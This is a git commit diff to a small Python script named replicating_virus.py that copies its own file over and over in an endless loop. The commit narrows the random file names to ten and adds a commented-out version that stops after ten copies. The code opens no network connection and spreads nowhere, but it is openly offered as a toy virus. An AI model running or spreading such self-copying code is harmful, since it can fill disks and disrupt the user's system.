8c856c56826d0b69aab51110bfb9e668f4191860
tanishk147 <152654450+tanishk147@users.noreply.github.com>
2025-01-22 11:31:38 +0530

    replicating_virus.py

--- replicating_virus.py
+++ replicating_virus.py
@@ -4,12 +4,25 @@ import random
 
 current_script = os.path.abspath(__file__)
 
+## to replicate for specific number
+#replication_limit = 10
+#replication_count = 0
+#
+#while replication_count < replication_limit:
+#    rand = random.randint(1, 1000000)
+#    replicated_script = f"{rand}.py"
+#    shutil.copyfile(current_script, replicated_script)
+#    replication_count += 1
+#
+#    print(f"Script replicated successfully as {replicated_script} ({replication_count}/{replication_limit})")
+#
+#print("Replication complete!")
+
 while True:
-    rand=random.randint(1,1000000)
+    rand=random.randint(1,10)
     replicated_script = f"{rand}.py"
     shutil.copyfile(current_script, replicated_script)
 
     print("Script replicated successfully as", replicated_script)
-
 
 
